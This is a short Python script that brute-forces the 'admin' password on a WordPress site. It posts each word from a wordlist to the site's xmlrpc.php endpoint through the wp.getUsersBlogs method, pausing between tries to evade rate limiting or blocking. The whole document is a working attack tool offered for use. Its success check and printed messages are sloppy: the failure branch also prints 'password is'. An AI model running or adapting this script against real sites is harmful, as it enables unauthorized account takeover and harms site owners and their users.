import requests
from bs4 import BeautifulSoup
import time

# Get the website URL to scan from the user
site_url = input("Please enter the website URL to scan: ")

# Open the wordlist file and read its content
with open("wordlist.txt", 'r') as wordlist:
    content = wordlist.read().splitlines()

# Iterate over each word in the wordlist
for words in content:
    # Construct the XML-RPC request body with the current word
    url = site_url + "/xmlrpc.php"
    body = "<?xml version=\"1.0\" ?>\n<methodCall>\n<methodName>wp.getUsersBlogs</methodName>\n<params>\n<param><value>admin</value></param><param><value>{}</value></param>\n</params></methodCall>\n".format(words)
    headers = {'Content-Type': 'text/xml'}

    try:
        # Make a POST request to the XML-RPC endpoint
        response = requests.post(url, data=body, headers=headers)
        time.sleep(2)  # Added delay to avoid rate limiting or blocking

        # Parse the response with BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        privilege_id = soup.find('privilege_id')

        # Check if the XML-RPC is vulnerable based on the response
        if privilege_id:
            print("the password is : {}".format(words))
            break
        else:
            print("password is : {}".format(words))

    except requests.exceptions.RequestException as e:
        print(f"Error while scanning with password '{words}': {e}")

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
